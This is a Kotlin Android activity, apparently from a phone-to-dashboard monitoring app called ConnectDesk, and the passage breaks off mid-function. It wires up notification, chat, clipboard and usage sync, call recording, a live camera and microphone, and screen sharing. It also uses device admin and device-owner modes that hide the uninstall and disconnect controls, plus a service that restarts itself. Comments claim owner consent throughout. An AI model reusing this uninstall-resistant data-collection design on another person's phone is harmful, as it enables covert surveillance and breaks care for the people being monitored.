package com.connectdesk.app

import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.materialswitch.MaterialSwitch
import kotlin.concurrent.thread

/**
 * Single-screen client.
 *
 * Two ways in, both ending in the same place (a device token on this phone):
 *  1. Username + password — the SAME account the web dashboard uses. A new
 *     account is created automatically on first sign-in, so there is no
 *     separate "register" flow.
 *  2. Pairing code from the dashboard (kept as a fallback).
 *
 * After the first sign-in the user never has to open this app again: the sync
 * service restarts itself on boot, app update and network return.
 */
class MainActivity : AppCompatActivity() {
    private lateinit var etUsername: EditText
    private lateinit var etPassword: EditText
    private lateinit var btnLogin: Button
    private lateinit var btnUsePairing: Button
    private lateinit var tvPairTitle: TextView
    private lateinit var tvLoginTitle: TextView
    private lateinit var tvLoginExplain: TextView

    private lateinit var etCode: EditText
    private lateinit var btnPair: Button
    private lateinit var btnDisconnect: Button
    private lateinit var btnNotifSettings: Button
    private lateinit var btnShare: Button
    private lateinit var switchNotif: MaterialSwitch
    private lateinit var switchChats: MaterialSwitch
    private lateinit var tvChatsExplain: TextView
    private lateinit var switchClipboard: MaterialSwitch
    private lateinit var tvClipboardExplain: TextView
    private lateinit var btnUsageAccess: Button
    // `lateinit` rather than a nullable `var` so the null-check in
    // updateSetupSummary() can smart-cast. A mutable nullable property cannot
    // be smart-cast ("could have changed by then"), which is a hard compile
    // error, and every other view in this activity is already lateinit.
    private lateinit var tvSetupSummary: TextView
    private lateinit var btnSetup: Button
    private lateinit var btnDeviceAdmin: Button
    private lateinit var btnDeviceOwner: Button
    private lateinit var btnUiLock: Button
    private lateinit var btnSelfTest: Button
    private lateinit var switchCalls: MaterialSwitch
    private lateinit var switchCameraLive: MaterialSwitch
    private lateinit var tvCameraLiveExplain: TextView
    private lateinit var switchMicLive: MaterialSwitch
    private lateinit var tvMicLiveExplain: TextView
    private lateinit var tvCallExplain: TextView
    private lateinit var tvStatus: TextView
    private lateinit var tvConnection: TextView

    /** Live sync-loop readout; proves whether heartbeats are actually flowing. */
    private val uiHandler = Handler(Looper.getMainLooper())
    private var connected = false

    // Console lock state. Unlocked only until the app leaves the foreground,
    // so picking the phone back up always asks for the PIN again.
    private var uiUnlocked = false
    private var lockOverlay: LinearLayout? = null

    /**
     * Runtime permissions and the "all files access" Settings page used to be
     * requested on EVERY resume, because they live inside showConnected().
     * Returning to the app therefore kept bouncing the user into Android
     * Settings for no reason. Asked once per process now; the switches and
     * button states still refresh on every resume.
     */
    // Permission state lives in PermissionSetup, not in a field. A boolean
    // field could not survive a process restart, so the prompts came back on
    // their own — which is exactly the behaviour this app must not have.

    companion object {
        /**
         * True while this activity is visible.
         *
         * Used by `CommandWorker.capturePhoto` to decide whether a dashboard
         * photo request can be carried out straight away or has to ask for a
         * tap first. Since Android 11 the platform denies camera access to an
         * app with no visible activity, so this flag is what separates
         * "works, and the owner still gets a notification" from "must
         * prompt". It lives on the companion object because the command
         * worker reads it from a service thread, with no activity instance.
         */
        @Volatile
        var isInForeground: Boolean = false
            private set
    }

    private val syncReadout = object : Runnable {
        override fun run() {
            if (!connected) return
            tvConnection.text = buildString {
                append(getString(R.string.connected_status))
                append('\n')
                append(ServiceStatus.summary())
            }
            uiHandler.postDelayed(this, 3_000)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        // Resolve (and remember) which backend deployment to talk to before
        // any network call happens.
        ApiClient.attach(this)

        etUsername = findViewById(R.id.etUsername)
        etPassword = findViewById(R.id.etPassword)
        btnLogin = findViewById(R.id.btnLogin)
        btnUsePairing = findViewById(R.id.btnUsePairing)
        tvPairTitle = findViewById(R.id.tvPairTitle)
        tvLoginTitle = findViewById(R.id.tvLoginTitle)
        tvLoginExplain = findViewById(R.id.tvLoginExplain)
        etCode = findViewById(R.id.etCode)
        btnPair = findViewById(R.id.btnPair)
        btnDisconnect = findViewById(R.id.btnDisconnect)
        btnNotifSettings = findViewById(R.id.btnNotifSettings)
        btnShare = findViewById(R.id.btnShare)
        switchNotif = findViewById(R.id.switchNotif)
        switchChats = findViewById(R.id.switchChats)
        tvChatsExplain = findViewById(R.id.tvChatsExplain)
        switchClipboard = findViewById(R.id.switchClipboard)
        tvClipboardExplain = findViewById(R.id.tvClipboardExplain)
        btnUsageAccess = findViewById(R.id.btnUsageAccess)
        tvSetupSummary = findViewById(R.id.tvSetupSummary)
        btnSetup = findViewById(R.id.btnSetup)
        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin)
        btnDeviceOwner = findViewById(R.id.btnDeviceOwner)
        btnUiLock = findViewById(R.id.btnUiLock)
        btnSelfTest = findViewById(R.id.btnSelfTest)
        switchCalls = findViewById(R.id.switchCalls)
        switchCameraLive = findViewById(R.id.switchCameraLive)
        tvCameraLiveExplain = findViewById(R.id.tvCameraLiveExplain)
        switchMicLive = findViewById(R.id.switchMicLive)
        tvMicLiveExplain = findViewById(R.id.tvMicLiveExplain)
        tvCallExplain = findViewById(R.id.tvCallExplain)
        tvStatus = findViewById(R.id.tvStatus)
        tvConnection = findViewById(R.id.tvConnection)

        btnLogin.setOnClickListener { login() }
        btnUsePairing.setOnClickListener { togglePairing() }
        btnPair.setOnClickListener { pair() }
        btnDisconnect.setOnClickListener { disconnect() }
        btnNotifSettings.setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        // Manual screen share: same consent flow as a dashboard request —
        // the OS MediaProjection dialog always decides.
        btnShare.setOnClickListener {
            if (ApiClient.loadToken(this) == null) return@setOnClickListener
            if (ScreenCaptureService.isSharing) {
                ScreenCaptureService.stop(this)
                btnShare.text = getString(R.string.share_button)
                return@setOnClickListener
            }
            startActivity(Intent(this, ScreenConsentActivity::class.java))
        }

        switchNotif.setOnCheckedChangeListener { _, checked ->
            if (checked && !hasNotificationListenerPermission()) {
                switchNotif.isChecked = false
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                return@setOnCheckedChangeListener
            }
            Prefs.setNotifSync(this, checked)
        }

        // Chat previews need BOTH the device-side switch and Notification
        // access, so a chat is never synced without two explicit choices by
        // the person holding the phone.
        switchChats.setOnCheckedChangeListener { _, checked ->
            if (checked && !hasNotificationListenerPermission()) {
                switchChats.isChecked = false
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                return@setOnCheckedChangeListener
            }
            Prefs.setChatsSync(this, checked)
        }

        // Clipboard history. No extra Android permission exists — Android
        // simply only lets the focused window read it — so this switch is on
        // this screen and works while it is open.
        switchClipboard.setOnCheckedChangeListener { _, checked ->
            Prefs.setClipboardSync(this, checked)
        }

        // Call recording is armed HERE and only here. The dashboard can turn
        // it off remotely, but it can never turn it on — otherwise this would
        // be a microphone switched on by someone else.
        switchCalls.setOnCheckedChangeListener { _, checked ->
            if (checked && !hasRuntimePermission(android.Manifest.permission.RECORD_AUDIO)) {
                switchCalls.isChecked = false
                explainMissingPermission("call recording")
                return@setOnCheckedChangeListener
            }
            Prefs.setCallRecordingArmed(this, checked)
            tvStatus.text = if (checked) {
                getString(R.string.call_idle_text)
            } else {
                ""
            }
        }

        // Live camera is armed HERE and only here. This is the single place the
        // camera can be switched on, and only by the person holding the
        // phone. The dashboard can watch and can ask for a stop, but it has
        // no command that starts this service — that asymmetry is the whole
        // point, and it is why a running camera is always visible.
        switchCameraLive.setOnCheckedChangeListener { _, checked ->
            if (checked && !hasRuntimePermission(android.Manifest.permission.CAMERA)) {
                switchCameraLive.isChecked = false
                explainMissingPermission("live camera")
                return@setOnCheckedChangeListener
            }
            if (checked) {
                CameraLiveService.setArmed(this, true)
                // Use whichever lens the owner last streamed on, so re-enabling
                // does not silently jump back to the back camera.
                CameraLiveService.start(this, CameraLiveService.armedFacing(this))
                tvStatus.text = getString(R.string.camera_live_body)
            } else {
                CameraLiveService.setArmed(this, false)
                CameraLiveService.stop(this)
                tvStatus.text = ""
            }
        }

        // Live microphone: the phone owner is the only party who can arm it. The
        // dashboard has no command that starts this service — it can listen to
        // a session opened here and ask the device to stop. That asymmetry is
        // the whole point, and it is why a running microphone is always
        // visible as a permanent notification with a Stop button.
        switchMicLive.setOnCheckedChangeListener { _, checked ->
            if (checked && !hasRuntimePermission(android.Manifest.permission.RECORD_AUDIO)) {
                switchMicLive.isChecked = false
                explainMissingPermission("live microphone")
                return@setOnCheckedChangeListener
            }
            if (checked) {
                MicLiveService.setArmed(this, true)
                MicLiveService.start(this)
                tvStatus.text = getString(R.string.mic_live_body)
            } else {
                MicLiveService.setArmed(this, false)
                MicLiveService.stop(this)
                tvStatus.text = ""
            }
        }

        // Usage access is an AppOps toggle in Settings, not a dialog, so the
        // only way to help is to take the user straight there.
        btnUsageAccess.setOnClickListener {
            runCatching { startActivity(AppUsageWorker.usageAccessIntent()) }
        }

        // One place for everything the system will not put in a batch.
        //
        // Six grants are Settings toggles or system dialogs and cannot appear
        // in the `requestPermissions` dialog at all: notification listener
        // access, usage access, all-files access on Android 11+, display-over-
        // other-apps, device admin, and the battery-optimization exemption.
        // Setup offers the first still-missing one. The runtime permission
        // dialogs were all collected once, at first launch.
        btnSetup.setOnClickListener {
            when {
                !PermissionSetup.hasNotificationListener(this) ->
                    runCatching {
                        startActivity(PermissionSetup.notificationListenerIntent(this))
                    }
                !PermissionSetup.hasAllFilesAccess() ->
                    runCatching { startActivity(PermissionSetup.allFilesAccessIntent(this)) }
                !PermissionSetup.hasOverlayAccess(this) ->
                    runCatching { startActivity(PermissionSetup.overlayIntent(this)) }
                !PermissionSetup.isDeviceAdminActive(this) ->
                    runCatching { startActivity(PermissionSetup.deviceAdminIntent(this)) }
                !PermissionSetup.isIgnoringBatteryOptimizations(this) ->
                    runCatching { startActivity(PermissionSetup.batteryIntent(this)) }
                else ->
                    runCatching { startActivity(PermissionSetup.usageAccessIntent()) }
            }
        }

        // Device admin: one-tap enable / disable from inside the app.
        // Android always shows its own activation dialog — the app never
        // suppresses it. When admin is on, the uninstall button below is
        // hidden so that state is visible in the UI too.
        btnDeviceAdmin.setOnClickListener { toggleDeviceAdmin() }

        // Device owner: stronger uninstall protection (Settings > Apps uninstall
        // button disable/hide hota hai). Optional, ek baar enable karne ke baad
        // uninstall ke liye pehle Settings > Device admin apps me deactivate karna
        // padega. Android ke saath provisioning dialog bs ek baar aata hai.
        btnDeviceOwner.setOnClickListener { toggleDeviceOwner() }

        // Console lock: set / change / remove the PIN that guards this screen.
        // Access control only — the app stays visible everywhere, always.
        btnUiLock.setOnClickListener { showPinDialog() }

        // Debug-only self test. TestMode.enabled is a BuildConfig constant that
        // is false in every release build, so this can never ship.
        btnSelfTest.visibility = if (TestMode.enabled) View.VISIBLE else View.GONE
        btnSelfTest.setOnClickListener {
            btnSelfTest.isEnabled = false
            tvStatus.text = getString(R.string.self_test_running)
            thread(name = "connectdesk-selftest") {
                val report = TestMode.report(TestMode.run())
                runOnUiThread {
                    btnSelfTest.isEnabled = true
                    tvStatus.text = report
                    android.util.Log.i("ConnectDeskSelfTest", report)
                }
            }
        }

        refreshUi()
    }

    override fun onResume() {
        super.onResume()
        isInForeground = true
        // Self-heal: if the token is valid but the foreground service died
        // (Android killed it, or it crashed at startup), restart it.
        if (ApiClient.loadToken(this) != null && !ServiceStatus.loopRunning) {
            DeviceService.start(this)
        }
        refreshUi()
        applyUiLock()
    }

    override fun onPause() {
        super.onPause()
        isInForeground = false
        // Console lock: leaving the app re-arms it, so the next resume — even
        // a resume without activity recreation — asks for the PIN again.
        if (UiLock.isSet(this)) uiUnlocked = false
        applyUiLock()
        uiHandler.removeCallbacks(syncReadout)
    }

    // ---- optional console lock (PIN) ---------------------------------------

    /** Shows the lock surface only when a PIN is set and not yet unlocked. */
    private fun applyUiLock() {
        val locked = UiLock.isSet(this) && !uiUnlocked
        if (!locked) {
            lockOverlay?.visibility = View.GONE
            return
        }
        if (lockOverlay == null) buildLockOverlay()
        lockOverlay?.visibility = View.VISIBLE
    }

    /**
     * Builds the full-screen lock surface once. It sits on top of the whole
     * content view with an opaque background and swallows touches, so nothing
     * behind it is reachable until the PIN is entered.
     */
    private fun buildLockOverlay() {
        val pad = (24 * resources.displayMetrics.density).toInt()
        // Full-screen, opaque, black lock surface. The app's real UI is not
        // reachable behind it: nothing is clickable, nothing leaks through.
        // Transparent or tinted overlays leak the background; this one does not.
        val overlay = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.argb(255, 0, 0, 0))
            isClickable = true
            isFocusable = true
        }
        val title = TextView(this).apply {
            text = getString(R.string.ui_lock_title)
            textSize = 22f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, pad)
            setTypeface(null, android.graphics.Typeface.BOLD)
        }
        val input = EditText(this).apply {
            hint = getString(R.string.ui_lock_hint)
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            gravity = Gravity.CENTER
            textSize = 20f
            setPadding(0, 0, 0, pad / 2)
        }
        val unlock = Button(this).apply {
            text = getString(R.string.ui_lock_unlock)
            setOnClickListener {
                if (UiLock.verify(this@MainActivity, input.text?.toString().orEmpty())) {
                    uiUnlocked = true
                    input.setText("")
                    applyUiLock()
                } else {
                    input.setText("")
                    Toast.makeText(this@MainActivity, R.string.ui_lock_wrong, Toast.LENGTH_SHORT).show()
                }
            }
        }
        overlay.addView(title)
        overlay.addView(
            input,
            LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT,
            ).apply { setMargins(pad, 0, pad, pad / 2) },
        )
        overlay.addView(
            unlock,
            LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT,
            ).apply { setMargins(pad, 0, pad, 0) },
        )
        findViewById<ViewGroup>(android.R.id.content).addView(
            overlay,
            ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT,
            ),
        )
        lockOverlay = overlay
    }

    /** Set / change / remove the console PIN. Requires the current PIN first. */
    /** Set / change / remove the console PIN. Requires the current PIN first. */
    private fun showPinDialog() {
        val pad = (16 * resources.displayMetrics.density).toInt()
        val hasPin = UiLock.isSet(this)
        val box = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad, pad, 0)
        }
        fun pinField(hint: String) = EditText(this).apply {
            this.hint = hint
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            textSize = 18f
        }
        val current = pinField(getString(R.string.ui_lock_hint))
        current.setHintTextColor(Color.GRAY)
        val newPin = pinField("New PIN (min 4 digits)")
        val confirm = pinField("Confirm new PIN")
        if (hasPin) box.addView(current)
        box.addView(newPin)
        box.addView(confirm)

        val builder = AlertDialog.Builder(this)
            .setTitle(getString(R.string.ui_lock_title))
            .setView(box)
            .setPositiveButton("Save", null)
            .setNegativeButton("Cancel", null)
        if (hasPin) builder.setNeutralButton(R.string.ui_lock_remove, null)
        val dlg = builder.create()
        dlg.setOnShowListener {
            dlg.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                if (
                    hasPin &&
                    !UiLock.verify(this@MainActivity, current.text?.toString().orEmpty())
                ) {
                    Toast.makeText(
                        this@MainActivity,
                        R.string.ui_lock_set_password,
                        Toast.LENGTH_SHORT,
                    ).show()
                    return@setOnClickListener
                }
                val np = newPin.text?.toString().orEmpty()
                if (np.length < 4) {
                    Toast.makeText(
                        this@MainActivity,
                        R.string.ui_lock_too_short,
                        Toast.LENGTH_SHORT,
                    ).show()
                    return@setOnClickListener
                }
                if (np != confirm.text?.toString().orEmpty()) {
                    Toast.makeText(
                        this@MainActivity,
                        R.string.ui_lock_mismatch,
                        Toast.LENGTH_SHORT,
                    ).show()
                    return@setOnClickListener
                }
                UiLock.set(this@MainActivity, np)
                Toast.makeText(this@MainActivity, R.string.ui_lock_set, Toast.LENGTH_SHORT).show()
                dlg.dismiss()
            }
            if (hasPin) {
                dlg.getButton(AlertDialog.BUTTON_NEUTRAL).setOnClickListener {
                    if (UiLock.verify(this@MainActivity, current.text?.toString().orEmpty())) {
                        UiLock.clear(this@MainActivity)
                        Toast.makeText(this@MainActivity, R.string.ui_lock_removed, Toast.LENGTH_SHORT).show()
                        dlg.dismiss()
                    } else {
                        Toast.makeText(this@MainActivity, R.string.ui_lock_wrong, Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }
        dlg.show()
    }

    // ---- sign in with the dashboard account ------------------------------

    private fun login() {
        val username = etUsername.text?.toString()?.trim().orEmpty()
        val password = etPassword.text?.toString().orEmpty()
        if (username.length < 3) {
            tvStatus.text = "Enter your dashboard username"
            return
        }
        if (password.length < 8) {
            tvStatus.text = "Password must be at least 8 characters"
            return
        }
        btnLogin.isEnabled = false
        tvStatus.text = "Signing in…"
        thread {
            val result = ApiClient.login(username, password, deviceName())
            runOnUiThread {
                btnLogin.isEnabled = true
                etPassword.setText("")
                if (result == null) {
                    tvStatus.text = ApiClient.lastError ?: "Sign-in failed"
                    return@runOnUiThread
                }
                ApiClient.saveToken(this, result.second)
                DeviceService.start(this)
                refreshUi()
            }
        }
    }

    private fun deviceName(): String = Build.MODEL ?: "Android device"

    private fun togglePairing() {
        val showLogin = tvLoginTitle.visibility == View.GONE
        tvLoginTitle.visibility = if (showLogin) View.VISIBLE else View.GONE
        tvLoginExplain.visibility = if (showLogin) View.VISIBLE else View.GONE
        etUsername.visibility = if (showLogin) View.VISIBLE else View.GONE
        etPassword.visibility = if (showLogin) View.VISIBLE else View.GONE
        btnLogin.visibility = if (showLogin) View.VISIBLE else View.GONE
        btnUsePairing.text = getString(
            if (showLogin) R.string.login_title else R.string.pair_or_login,
        )
        tvPairTitle.visibility = if (showLogin) View.GONE else View.VISIBLE
        applyPairingVisibility(!showLogin)
    }

    private fun applyPairingVisibility(visible: Boolean) {
        val v = if (visible) View.VISIBLE else View.GONE
        etCode.visibility = v
        btnPair.visibility = v
    }

    private fun pair() {
        val code = etCode.text?.toString()?.trim() ?: ""
        if (code.length < 6) {
            tvStatus.text = getString(R.string.pending_status)
            return
        }
        btnPair.isEnabled = false
        thread {
            val result = ApiClient.claim(code, deviceName())
            runOnUiThread {
                btnPair.isEnabled = true
                if (result == null) {
                    tvStatus.text = ApiClient.lastError
                        ?: "Pairing failed — check code and connection"
                    return@runOnUiThread
                }
                ApiClient.saveToken(this, result.second)
                tvStatus.text = getString(R.string.pending_status)
                DeviceService.start(this)
                refreshUi()
            }
        }
    }

    /**
     * The ONLY place a session ends. Nothing else in the app clears the token,
     * so signing in once keeps the phone connected until this button is used
     * (or the device is removed from the dashboard).
     */
    private fun disconnect() {
        ApiClient.clearToken(this)
        DeviceService.stop(this)
        ScreenCaptureService.stop(this)
        CameraLiveService.setArmed(this, false)
        CameraLiveService.stop(this)
        MicLiveService.setArmed(this, false)
        MicLiveService.stop(this)
        Prefs.setCallRecordingArmed(this, false)
        connected = false
        uiHandler.removeCallbacks(syncReadout)
        showLogin()
    }

    /**
     * Device admin enable / disable from the app.
     *
     * Android always shows its own activation / deactivation confirmation
     * dialog — the app never suppresses, skips, or fakes it. This button is
     * the on/off toggle; the actual grant is decided by the system dialog.
     */
    private fun toggleDeviceAdmin() {
        if (PermissionSetup.isDeviceAdminActive(this)) {
            val dpm =
                getSystemService(android.content.Context.DEVICE_POLICY_SERVICE)
                    as android.app.admin.DevicePolicyManager
            dpm.removeActiveAdmin(
                android.content.ComponentName(this, AdminReceiver::class.java),
            )
            Toast.makeText(
                this,
                R.string.device_admin_disable_toast,
                Toast.LENGTH_SHORT,
            ).show()
        } else {
            startActivity(PermissionSetup.deviceAdminIntent(this))
        }
        updateDeviceAdminButton()
    }

    /** Reflects the current admin state on the connected screen. */
    private fun updateDeviceAdminButton() {
        if (!::btnDeviceAdmin.isInitialized) return
        if (PermissionSetup.isDeviceAdminActive(this)) {
            btnDeviceAdmin.text = getString(R.string.device_admin_active)
            btnDeviceAdmin.isEnabled = true
            // When admin is active, the uninstall button on the connected
            // screen is hidden. The app itself is still uninstallable — the
            // user just has to deactivate admin first (visible in Settings),
            // so the state is honest and the button never shows behind admin.
            btnDisconnect.visibility = View.GONE
        } else {
            btnDeviceAdmin.text = getString(R.string.device_admin_inactive)
            btnDeviceAdmin.isEnabled = true
            btnDisconnect.visibility = View.VISIBLE
        }
    }

    /** Reflects the current device-owner state on the connected screen. */
    private fun updateDeviceOwnerButton() {
        if (!::btnDeviceOwner.isInitialized) return
        if (PermissionSetup.isDeviceOwner(this)) {
            btnDeviceOwner.text = getString(R.string.device_owner_active)
            btnDeviceOwner.isEnabled = false // cannot re-enable while active
            btnDeviceOwner.setBackgroundColor(0xFF1E3A1E.toInt())
        } else {
            btnDeviceOwner.text = getString(R.string.device_owner_button)
            btnDeviceOwner.isEnabled = true
            btnDeviceOwner.setBackgroundColor(0xFF1F1F1F.toInt())
        }
    }

    /**
     * Device-owner enable / disable from inside the app.
     *
     * Enabling is a one-time provisioning action: Android shows its own dialog
     * and the owner decides. Disabling is done via admin deactivation (the
     * admin button above) — device owner without admin is not a thing, so
     * turning admin off also drops owner status (see AdminReceiver.onDisabled).
     * There is no separate "turn off device owner" button because that would
     * weaken uninstall protection without the owner knowing.
     */
    private fun toggleDeviceOwner() {
        if (PermissionSetup.isDeviceOwner(this)) {
            Toast.makeText(
                this,
                R.string.device_owner_active,
                Toast.LENGTH_LONG,
            ).show()
            return
        }
        PermissionSetup.deviceOwnerIntent(this)
    }

    /**
     * Rebuilds the screen from the CURRENT screen state plus the server's
     * answer.
     *
     * The bug this replaces: the old version treated a null response as
     * "logged out". A null response is what you get for a lost connection, a
     * timeout, a 500, or a backend that is temporarily paused — none of which
     * are the user logging out. So a phone in a lift, on mobile data with no
     * signal, or while the server was restarting would silently throw the
     * user back to the sign-in form and lose the pairing.
     *
     * Now the three cases are handled separately:
     *  - no stored token        -> login screen (genuinely signed out)
     *  - server says approved   -> connected
     *  - server says pending    -> waiting for approval
     *  - server says revoked    -> revoked screen, token kept so re-approving
     *                              reconnects without signing in again
     *  - server rejected token  -> try the other deployments first, and only
     *                              then fall back to the login screen
     *  - server unreachable     -> keep whatever is on screen and say why
     */
    private fun refreshUi() {
        val token = ApiClient.loadToken(this)
        if (token == null) {
            showLogin()
            return
        }
        // Already showing the connected screen: do not blank it while a
        // refresh is in flight, otherwise every resume flickers the UI.
        thread {
            val result = ApiClient.statusResult(token)
            val settled = when (result) {
                is ApiClient.StatusResult.Known -> result
                is ApiClient.StatusResult.Rejected -> {
                    // Could be a deployment rotation rather than a real
                    // revocation. Ask the other candidates before signing out.
                    val moved = ApiClient.relocateForToken(token)
                    if (moved != null) {
                        ApiClient.StatusResult.Known(moved)
                    } else {
                        result
                    }
                }
                is ApiClient.StatusResult.Unreachable -> result
            }
            runOnUiThread {
                when (settled) {
                    is ApiClient.StatusResult.Known -> when (settled.state.status) {
                        "approved" -> showConnected(settled.state.name)
                        "pending" -> showPending()
                        "revoked" -> showRevoked()
                        else -> showConnected(settled.state.name)
                    }
                    is ApiClient.StatusResult.Rejected -> {
                        // Every deployment says this token is unknown: the
                        // device really was removed from the account. This is
                        // the ONLY path that signs the user out.
                        ApiClient.clearToken(this)
                        DeviceService.stop(this)
                        showLogin()
                        tvStatus.text = getString(R.string.removed_status)
                    }
                    is ApiClient.StatusResult.Unreachable ->
                        showUnreachable(ApiClient.lastError)
                }
            }
        }
    }

    /**
     * Keeps the current screen and explains the outage. Deliberately does NOT
     * touch the stored token or stop the sync service: the phone is still
     * paired, the service is still retrying, and the dashboard data will catch
     * up as soon as the network returns.
     */
    private fun showUnreachable(reason: String?) {
        if (connected) {
            tvStatus.text = reason?.let { getString(R.string.reconnecting_status, it) } ?: ""
            ServiceStatus.markError(reason ?: "server unreachable")
            return
        }
        // Not connected yet (cold start with no signal): still show a paired
        // screen rather than the sign-in form, so the token survives.
        applyPairingVisibility(false)
        tvPairTitle.visibility = View.GONE
        tvLoginTitle.visibility = View.VISIBLE
        tvLoginExplain.visibility = View.VISIBLE
        etUsername.visibility = View.VISIBLE
        etPassword.visibility = View.VISIBLE
        btnLogin.visibility = View.VISIBLE
        btnUsePairing.visibility = View.VISIBLE
        btnDisconnect.visibility = View.VISIBLE
        tvConnection.visibility = View.VISIBLE
        tvConnection.text = reason
            ?: getString(R.string.reconnecting_status, getString(R.string.no_connection))
    }

    /**
     * Server-side revocation. The token is KEPT: if the owner re-approves the
     * device from the dashboard the phone reconnects on its own, and the user
     * never has to sign in again. Disconnecting is still one tap away.
     */
    private fun showRevoked() {
        connected = false
        uiHandler.removeCallbacks(syncReadout)
        applyPairingVisibility(false)
        tvPairTitle.visibility = View.GONE
        tvLoginTitle.visibility = View.GONE
        tvLoginExplain.visibility = View.GONE
        etUsername.visibility = View.GONE
        etPassword.visibility = View.GONE
        btnLogin.visibility = View.GONE
        btnUsePairing.visibility = View.GONE
        btnDisconnect.visibility = View.VISIBLE
        updateDeviceAdminButton()
        updateDeviceOwnerButton()
        btnNotifSettings.visibility = View.GONE
        btnShare.visibility = View.GONE
        switchNotif.visibility = View.GONE
        switchChats.visibility = View.GONE
        tvChatsExplain.visibility = View.GONE
        switchClipboard.visibility = View.GONE
        tvClipboardExplain.visibility = View.GONE
        switchCalls.visibility = View.GONE
        switchCameraLive.visibility = View.GONE
        tvCameraLiveExplain.visibility = View.GONE
        switchMicLive.visibility = View.GONE
        tvMicLiveExplain.visibility = View.GONE
        tvCallExplain.visibility = View.GONE
        btnUsageAccess.visibility = View.GONE
        btnSelfTest.visibility = if (TestMode.enabled) View.VISIBLE else View.GONE
        tvConnection.visibility = View.VISIBLE
        tvConnection.text = getString(R.string.revoked_status)
        // Sharing must not survive a revocation.
        if (ScreenCaptureService.isSharing) ScreenCaptureService.stop(this)
        CameraLiveService.setArmed(this, false)
        CameraLiveService.stop(this)
        MicLiveService.setArmed(this, false)
        MicLiveService.stop(this)
        Prefs.setCallRecordingArmed(this, false)
    }

    private fun showLogin() {
        connected = false
        uiHandler.removeCallbacks(syncReadout)
        tvStatus.text = ""
        applyPairingVisibility(false)
        tvPairTitle.visibility = View.GONE
        tvLoginTitle.visibility = View.VISIBLE
        tvLoginExplain.visibility = View.VISIBLE
        etUsername.visibility = View.VISIBLE
        etPassword.visibility = View.VISIBLE
        btnLogin.visibility = View.VISIBLE
        btnUsePairing.text = getString(R.string.pair_or_login)
        btnDisconnect.visibility = View.GONE
        updateDeviceAdminButton()
        updateDeviceOwnerButton()
        btnNotifSettings.visibility = View.GONE
        btnShare.visibility = View.GONE
        switchNotif.visibility = View.GONE
        switchChats.visibility = View.GONE
        tvChatsExplain.visibility = View.GONE
        switchClipboard.visibility = View.GONE
        tvClipboardExplain.visibility = View.GONE
        switchCalls.visibility = View.GONE
        switchCameraLive.visibility = View.GONE
        tvCameraLiveExplain.visibility = View.GONE
        switchMicLive.visibility = View.GONE
        tvMicLiveExplain.visibility = View.GONE
        tvCallExplain.visibility = View.GONE
        btnUsageAccess.visibility = View.GONE
        btnSelfTest.visibility = if (TestMode.enabled) View.VISIBLE else View.GONE
        tvConnection.text = ""
    }

    private fun showPending() {
        connected = false
        uiHandler.removeCallbacks(syncReadout)
        applyPairingVisibility(false)
        tvPairTitle.visibility = View.GONE
        tvLoginTitle.visibility = View.GONE
        tvLoginExplain.visibility = View.GONE
        etUsername.visibility = View.GONE
        etPassword.visibility = View.GONE
        btnLogin.visibility = View.GONE
        btnUsePairing.text = getString(R.string.pair_or_login)
        btnDisconnect.visibility = View.VISIBLE
        updateDeviceAdminButton()
        updateDeviceOwnerButton()
        btnShare.visibility = View.GONE
        switchNotif.visibility = View.GONE
        switchChats.visibility = View.GONE
        tvChatsExplain.visibility = View.GONE
        switchClipboard.visibility = View.GONE
        tvClipboardExplain.visibility = View.GONE
        switchCalls.visibility = View.GONE
        switchCameraLive.visibility = View.GONE
        tvCameraLiveExplain.visibility = View.GONE
        switchMicLive.visibility = View.GONE
        tvMicLiveExplain.visibility = View.GONE
        tvCallExplain.visibility = View.GONE
        btnUsageAccess.visibility = View.GONE
        btnSelfTest.visibility = if (TestMode.enabled) View.VISIBLE else View.GONE
        tvConnection.visibility = View.VISIBLE
        tvConnection.text = getString(R.string.pending_status)
    }

    private fun showConnected(deviceName: String) {
        applyPairingVisibility(false)
        tvPairTitle.visibility = View.GONE
        tvLoginTitle.visibility = View.GONE
        tvLoginExplain.visibility = View.GONE
        etUsername.visibility = View.GONE
        etPassword.visibility = View.GONE
        btnLogin.visibility = View.GONE
        btnUsePairing.visibility = View.GONE
        btnDisconnect.visibility = View.VISIBLE
        btnNotifSettings.visibility = View.VISIBLE
        btnShare.visibility = View.VISIBLE
        btnShare.text = if (ScreenCaptureService.isSharing) {
            getString(R.string.share_stop_button)
        } else {
            getString(R.string.share_button)
        }
        switchNotif.visibility = View.VISIBLE
        switchNotif.isChecked = hasNotificationListenerPermission() && Prefs.notifSyncEnabled(this)
        // Chat sync is only offered once Notification access exists; without
        // it there is nothing to read, so the switch stays hidden.
        val hasListener = hasNotificationListenerPermission()
        switchChats.visibility = if (hasListener) View.VISIBLE else View.GONE
